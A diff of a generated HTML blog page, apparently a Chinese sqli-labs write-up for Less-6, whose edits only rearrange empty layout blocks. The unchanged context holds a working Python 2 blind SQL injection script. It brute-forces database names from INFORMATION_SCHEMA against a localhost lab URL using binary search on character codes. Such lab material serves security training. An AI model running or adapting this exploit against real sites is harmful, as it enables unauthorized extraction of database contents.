@@ -495,21 +495,8 @@ Less5-6是盲注">
 <h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>采用盲注。分析同Less5。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">'http://localhost:20000/sqllab/Less-6/?id=1" '</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
 
       
-    </div>
-	<div>
-      
-        
-
-      
-	</div>
-    <div>
-      
-        
-
-      
-    </div>
-
-    <div>
+  </div>
+      <div>
       
         
   <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
@@ -533,6 +520,20 @@ Less5-6是盲注">
 
       
     </div>
+	<div>
+      
+        
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+
 
 
     <footer class="post-footer">
